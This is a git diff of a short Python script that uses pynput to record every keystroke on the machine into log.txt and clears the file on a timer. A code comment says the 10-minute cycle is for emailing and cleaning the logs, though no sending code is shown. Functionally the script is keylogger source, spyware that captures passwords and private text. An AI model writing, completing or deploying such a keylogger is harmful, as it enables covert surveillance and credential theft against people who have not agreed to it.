@@ -1,12 +1,12 @@
-import pynput, schedule, time, threading
+import pynput, time, threading, os
 
 from pynput.keyboard import Key, Listener
 from threading import Thread
 
-CYCLE = 10 # Time interval to record Logs.
+CYCLE = 60*10 # Time interval to Email and Clean Logs. (10 Minutes)
 FILENAME = "log.txt" # Filename.
 finished = False # Global Track to see if Log is finished.
-
+ReplaceCode = {Key.space: ' ', Key.enter: '\n'} # Dict Containing Non-alpha keys.
 
 # Key Press.
 def on_press(key):
@@ -15,10 +15,12 @@ def on_press(key):
     # Different Write Based on Key Pressed.
     if hasattr(key, 'char'):
         text = key.char
-    elif key == Key.enter:
-        text = '\n'
-    elif key == Key.backspace:
-        text = ' {0} '.format(str(key))
+    elif key in ReplaceCode:
+        text = ReplaceCode[key]
+    elif key == Key.backspace: # Remove last character in file if backspace was read.
+        with open(FILENAME, 'rb+') as file:
+            file.seek(-1, os.SEEK_END)
+            file.truncate() # Remove the last character.
 
     # Write to file if text is valid.
     if text != None:
@@ -40,7 +42,6 @@ def IntervalFileCls():
         if (ElapsedTime == CYCLE): # If 10s has passed.
             clean_file(FILENAME)
             StartTime = time.time() # Reset Start Time.
-
 
 def clean_file(file):
     open(file, 'w').close()
@@ -69,5 +70,6 @@ def main():
 
 # Execute if it is the main module.
 if __name__ == "__main__":
+    # Multi Threads.
     Thread(target=main).start()
     Thread(target=IntervalFileCls).start()
